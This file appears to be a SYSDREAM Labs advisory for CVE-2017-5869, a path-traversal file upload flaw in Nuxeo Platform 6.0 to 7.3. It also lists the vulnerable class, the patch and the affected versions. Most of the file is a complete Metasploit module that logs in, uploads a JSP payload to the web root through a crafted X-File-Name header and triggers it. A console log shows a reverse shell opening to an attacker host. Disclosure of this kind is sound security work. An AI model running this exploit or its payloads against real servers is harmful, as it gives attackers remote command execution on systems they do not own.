@@ -1,0 +1,216 @@
+=begin
+# Description
+
+Nuxeo Platform is a content management system for enterprises (CMS).
+It embeds an Apache Tomcat server, and can be managed through a web
+interface.
+
+One of its features allows authenticated users to import files to the
+platform.
+By crafting the upload request with a specific ``X-File-Name`` header,
+one can successfuly upload a file at an arbitrary location of the server
+file system.
+
+It is then possible to upload a JSP script to the root directory of the
+web application to execute commands on the remote host operating system.
+Setting the value ``../../nxserver/nuxeo.war/shell.jsp`` to the
+``X-File-Name`` header is a way to do so.
+
+## Details
+
+**CVE ID**: CVE-2017-5869
+
+**Access Vector**: network
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-434
+
+**CVSS Base Score**: 8.8
+
+**CVSS Vector**: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+
+# Proof of Concept
+
+Here is a metasploit module to exploit this vulnerability:
+
+=end
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+    Rank = ExcellentRanking
+
+    include Msf::Exploit::Remote::HttpClient
+
+    def initialize(info={})
+        super(update_info(info,
+            'Name'              => "Nuxeo Platform File Upload RCE",
+            'Description'       => %q{
+                The Nuxeo Platform tool is vulnerable to an authenticated remote code execution,
+                thanks to an upload module.
+            },
+            'License'           => MSF_LICENSE,
+            'Author'            => ['Ronan Kervella <r.kervella@sysdream.com>'],
+            'References'        =>
+                [
+                    ['https://nuxeo.com/', '']
+                ],
+            'Platform'          => %w{linux},
+            'Targets'           => [ ['Nuxeo Platform 6.0 to 7.3', 'Platform' => 'linux'] ],
+            'Arch'              => ARCH_JAVA,
+            'Privileged'        => true,
+            'Payload'           => {},
+            'DisclosureDate'    => "",
+            'DefaultTarget'     => 0))
+        register_options(
+            [
+                OptString.new('TARGETURI', [true, 'The path to the nuxeo application', '/nuxeo']),
+                OptString.new('USERNAME', [true, 'A valid username', '']),
+                OptString.new('PASSWORD', [true, 'Password linked to the username', ''])
+            ], self.class)
+    end
+
+    def jsp_filename
+        @jsp_filename ||= Rex::Text::rand_text_alpha(8) + '.jsp'
+    end
+
+    def jsp_path
+        'nxserver/nuxeo.war/' + jsp_filename
+    end
+
+    def nuxeo_login
+        res = send_request_cgi(
+            'method' => 'GET',
+            'uri'    => normalize_uri(target_uri.path, '/login.jsp')
+        )
+
+        fail_with(Failure::Unreachable, 'No response received from the target.') unless res
+        session_cookie = res.get_cookies
+
+        res = send_request_cgi(
+            'method'    => 'POST',
+            'uri'       => normalize_uri(target_uri.path, '/nxstartup.faces'),
+            'cookie'    => session_cookie,
+            'vars_post' => {
+                'user_name'     => datastore['USERNAME'],
+                'user_password' => datastore['PASSWORD'],
+                'submit'        => 'Connexion'
+            }
+        )
+        return session_cookie if res && res.code == 302 && res.redirection.to_s.include?('view_home.faces')
+        nil
+    end
+
+    def trigger_shell
+        res = send_request_cgi(
+            'method'    => 'GET',
+            'uri'       => normalize_uri(target_uri.path, jsp_filename)
+        )
+        fail_with(Failure::Unknown, 'Unable to get #{full_uri}/#{jsp_filename}') unless res && res.code == 200
+    end
+
+    def exploit
+        print_status("Authenticating using #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
+        session_cookie = nuxeo_login
+        if session_cookie
+            payload_url = normalize_uri(target_uri.path, jsp_filename)
+            res = send_request_cgi(
+                'method'    => 'POST',
+                'uri'       => normalize_uri(target_uri.path, '/site/automation/batch/upload'),
+                'cookie'    => session_cookie,
+                'headers'    => {
+                    'X-File-Name'   => '../../' + jsp_path,
+                    'X-Batch-Id'    => '00',
+                    'X-File-Size'   => '1024',
+                    'X-File-Type'   => '',
+                    'X-File-Idx'    => '0',
+                    'X-Requested-With'  => 'XMLHttpRequest'
+                },
+                'ctype'             => '',
+                'data' => payload.encoded
+            )
+            fail_with(Failure::Unknown, 'Unable to upload the payload') unless res && res.code == 200
+            print_status("Executing the payload at #{normalize_uri(target_uri.path, payload_url)}.")
+            trigger_shell
+        else
+            fail_with(Failure::Unknown, 'Unable to login')
+        end
+    end
+
+end
+
+=begin
+Module output:
+
+```bash
+msf> use exploit/multi/http/nuxeo
+msf exploit(nuxeo) > set USERNAME user1
+USERNAME => user1
+msf exploit(nuxeo) > set PASSWORD password
+PASSWORD => password
+msf exploit(nuxeo) > set rhost 192.168.253.132
+rhost => 192.168.253.132
+msf exploit(nuxeo) > set payload java/jsp_shell_reverse_tcp
+payload => java/jsp_shell_reverse_tcp
+msf exploit(nuxeo) > set lhost 192.168.253.1
+lhost => 192.168.253.1
+msf exploit(nuxeo) > exploit
+
+[-] Handler failed to bind to 192.168.253.1:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444
+[*] Authenticating using user1:password
+[*] Executing the payload at /nuxeo/nuxeo/QBCefwxQ.jsp.
+[*] Command shell session 1 opened (172.17.0.2:4444 ->
+192.168.253.132:43279) at 2017-01-13 14:47:25 +0000
+
+id
+uid=1000(nuxeo) gid=1000(nuxeo)
+groups=1000(nuxeo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare)
+pwd
+/var/lib/nuxeo/server
+```
+
+# Vulnerable code
+
+The vulnerable code is located in the
+`org.nuxeo.ecm.restapi.server.jaxrs.BatchUploadObject` class ([github
+link](https://github.com/nuxeo/nuxeo/blob/b05dde789a6c0c7b5f361608eb6d6bd0fda31f36/nuxeo-features/rest-api/nuxeo-rest-api-server/src/main/java/org/nuxeo/ecm/restapi/server/jaxrs/BatchUploadObject.java#L150)),
+where the header ``X-File-Name`` is not checked.
+
+# Fix
+
+Nuxeo provided a
+[patch](https://github.com/nuxeo/nuxeo/commit/6b3113977ef6c2307f940849a2c196621ebf1892)
+for this issue.
+A hotfix release is also available for Nuxeo 6.0 (Nuxeo 6.0 HF35).
+
+Please note that vulnerability does not affect Nuxeo versions above 7.3.
+
+# Affected versions
+
+* Nuxeo 6.0 (LTS 2014), released 2014-11-06
+* Nuxeo 7.1 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-01-15
+* Nuxeo 7.2 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-03-24
+* Nuxeo 7.3 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-06-24
+
+# Unaffected versions
+
+* Nuxeo 6.0 HF35, released 2017-01-12
+* Nuxeo 7.4 (Fast Track, obsoleted by Nuxeo 7.10), released 2015-10-02
+* Nuxeo 7.10 (LTS 2015), released 2015-11-09
+* Nuxeo 8.10 (LTS 2016), released 2016-12-06
+
+# Credits
+
+Ronan Kervella <r.kervella@sysdream.com>
+
+-- SYSDREAM Labs <labs@sysdream.com> 
+GPG : 47D1 E124 C43E F992 2A2E 1551 8EB4 8CD9 D5B2 59A1 
+* Website: https://sysdream.com/ 
+* Twitter: @sysdream 
+=end
